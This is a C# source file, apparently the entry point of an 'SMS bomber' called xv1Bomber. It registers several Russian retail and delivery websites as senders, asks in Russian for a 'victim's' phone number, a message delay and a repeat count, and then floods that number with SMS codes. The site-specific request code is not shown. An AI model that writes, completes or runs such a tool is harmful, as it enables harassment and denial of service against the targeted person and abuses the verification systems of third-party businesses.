using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using xv1Bomb.WebSites;

namespace xv1Bomb
{
    class Program
    {
        static async Task Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"    __      ____ ____                  _               ");
            Console.WriteLine(@"    \ \    / /_ |  _ \                | |              ");
            Console.WriteLine(@"__  _\ \  / / | | |_) | ___  _ __ ___ | |__   ___ _ __ ");
            Console.WriteLine(@"\ \/ /\ \/ /  | |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|");
            Console.WriteLine(@" >  <  \  /   | | |_) | (_) | | | | | | |_) |  __/ |   ");
            Console.WriteLine(@"/_/\_\  \/    |_|____/ \___/|_| |_| |_|_.__/ \___|_|   ");
            Console.WriteLine();

            var bomber = new Bomber();
            bomber.AddObserver(new posudaMart());
            bomber.AddObserver(new kari());
            bomber.AddObserver(new bapteka());
            bomber.AddObserver(new yandexGo());
            bomber.AddObserver(new burgerking());
            bomber.AddObserver(new sushistudio());
            //bomber.AddObserver(new dodoPizza());

            CancellationTokenSource cts = new CancellationTokenSource();
            
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Введите номер жертвы в формате (XXX)(XXX)(XX)(XX). Пример - 9641241212 ");
            Console.ForegroundColor = ConsoleColor.White;
            string phoneNumber = Console.ReadLine();
            
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Введите задержку между смс-ками (0 - почти без задержки): ");
            Console.ForegroundColor = ConsoleColor.White;
            int delay = Int32.Parse(Console.ReadLine());
            
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("введите кол-во повторений: ");
            Console.ForegroundColor = ConsoleColor.White;
            int repeat = Int32.Parse(Console.ReadLine());
            
            await bomber.Start(phoneNumber, cts.Token, repeat, delay);

            if(Console.ReadLine()=="") cts.Cancel();
            Console.ReadLine();
        }
    }
}